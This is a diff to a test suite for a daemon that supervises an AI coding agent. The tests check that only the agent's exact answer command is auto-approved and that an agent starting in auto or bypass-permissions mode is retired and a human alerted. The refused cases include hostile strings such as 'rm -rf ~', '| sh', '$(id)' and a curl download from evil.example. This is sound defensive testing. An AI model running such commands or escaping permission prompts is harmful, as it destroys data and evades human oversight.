@@ -55,12 +55,27 @@ for text in ('needs the staging API key', 'waiting for login', 'push to main', '
 assert not B.blocker_is_askable(plan('a flaky test', cls='C4'))
 # the only approval the daemon gives the brain: exactly its answer command
 screen = open(sys.argv[2]).read()
-i = screen.rindex('touch created.txt')
-answer = screen[:i] + 'herdr-peers autopilot answer q-0123456789ab leave' + screen[i + len('touch created.txt'):]
-assert B.approval_is_answer(answer)
-assert not B.approval_is_answer(screen), 'any other command'
-for tail in ('; rm -rf ~', ' && curl x', ' | sh', ' $(id)', ' `id`', ' > /tmp/x'):
-    assert not B.approval_is_answer(answer.replace('q-0123456789ab leave', 'q-0123456789ab leave' + tail)), tail
+i = screen.rindex(' touch created.txt')
+block = lambda b: screen[:i] + b + screen[i + len(' touch created.txt'):]
+A = ' herdr-peers autopilot answer q-0123456789ab leave'
+assert B.approval_is_answer('claude', block(A))
+assert not B.approval_is_answer('claude', screen), 'any other command'
+assert not B.approval_is_answer('codex', block(A)), 'another kind fails closed until it has its own fixture'
+refused = {
+    'a second line after': A + '\n rm -rf ~/work',
+    'a line before': ' rm -rf ~/work\n' + A,
+    'a download before': ' curl -o /tmp/x https://evil.example/x\n' + A,
+    'a command pushed out of a window': ' python3 -c "import os"\n' + '\n'.join(' x%d' % k for k in range(12)) + '\n' + A,
+    'another binary by path': ' /tmp/evil/herdr-peers autopilot answer q-0123456789ab leave',
+    'a relative binary': ' ./herdr-peers autopilot answer q-0123456789ab leave',
+    'chained': A + '; rm -rf ~', 'and-ed': A + ' && curl x', 'piped': A + ' | sh',
+    'substituted': A + ' $(id)', 'redirected': A + ' > /tmp/x', 'an empty block': ' ',
+}
+for name, b in refused.items():
+    assert not B.approval_is_answer('claude', block(b)), name
+assert B.AUTO_MODE.search('  ⏵⏵ auto mode on (shift+tab to cycle) · ← for agents')
+assert B.AUTO_MODE.search('  ⏵⏵ bypass permissions on (shift+tab to cycle)')
+assert not B.AUTO_MODE.search('  ? for shortcuts')
 # answers: only the brain's own pane and terminal, an open question, an allowed action
 b = B.Brain(); b.pane, b.terminal = 'w9:p1', 'term_w9p1'
 b.questions['q-0123456789ab'] = {'case': 'plan_stalled', 'key': 'k', 'at': 100.0, 'answered': False}
@@ -121,7 +136,8 @@ class IO(object):
     def random_bytes(self, n):
         self.n += 1
         return (b'%06d' % self.n)[:n]
-    def brain_launch(self, kinds, models):
+    def brain_launch(self, kinds, models, exclude=()):
+        self.excluded_seen = list(exclude)
         if self.fail_launch:
             raise RuntimeError('no account')
         self.launched.append((tuple(kinds), dict(models)))
@@ -281,11 +297,22 @@ step(ap)
 assert keyed == [], 'a permission prompt in the brain pane is never keyed'
 assert any(o[2] == 'brain_permission_refused' for o in io.log)
 assert io.events.count('needs_human') == 1, 'the human is told once'
-i = screen.rindex('touch created.txt')
-io.screens['w9:p1'] = screen[:i] + 'herdr-peers autopilot answer q-0123456789ab leave' + screen[i + len('touch created.txt'):]
+i = screen.rindex(' touch created.txt')
+io.screens['w9:p1'] = screen[:i] + ' herdr-peers autopilot answer q-0123456789ab leave' + screen[i + len(' touch created.txt'):]
 io.rows['local'] = [row('w9:p1', 'blocked', 4)]
 step(ap)
 assert keyed and set(keyed) == {'w9:p1'}, 'its own answer command is approved (the fake screen does not move, so twice)'
+# A brain whose profile starts in auto or bypass mode is retired at once, its profile excluded.
+io, ap = fresh()
+ap.run_pass()
+io.rows['local'] = [row('w9:p1', 'idle', 2)]
+io.screens['w9:p1'] = 'Claude Code\n\n❯ \n  ⏵⏵ auto mode on (shift+tab to cycle) · ← for agents'
+step(ap)
+assert not [t for p, t in io.sent if p == 'w9:p1'], 'never briefed'
+assert any(o[2] == 'brain_replaced' for o in io.log) and io.released, io.log[-3:]
+assert io.events.count('needs_human') == 1
+step(ap)
+assert io.excluded_seen == ['@work1'], io.excluded_seen
 # The brain closes: lease released, workspace closed.
 io, ap = fresh()
 ap.run_pass()
@@ -326,6 +353,7 @@ WSLOG=$(cat "$FAKE_HERDR_DIR/local/workspaces.log")
 case "$WSLOG" in *"\"--cwd\", \"$(state_dir)/brain-"*) t_ok "the brain's home is a fresh directory of its own";; *) t_fail "the brain's home is a fresh directory of its own" "$WSLOG";; esac
 assert_not_contains "never the state directory itself" "$WSLOG" "\"--cwd\", \"$(state_dir)\"]"
 if ls -d "$(state_dir)"/brain-* >/dev/null 2>&1; then t_fail "its home is removed when the brain is closed"; else t_ok "its home is removed when the brain is closed"; fi
+assert_contains "its shell finds this very helper first on PATH" "$WSLOG" "PATH=$ROOT/skills/herdr-peers/scripts:"
 assert_contains "a workspace of its own is created" "$(cat "$FAKE_HERDR_DIR/local/workspaces.log")" '"--label", "autopilot brain"'
 RUNLINE=$(cat "$FAKE_HERDR_DIR/local/runs.log")
 assert_contains "the brain starts in that workspace's fresh pane" "$RUNLINE" '"pane": "w9:p1"'
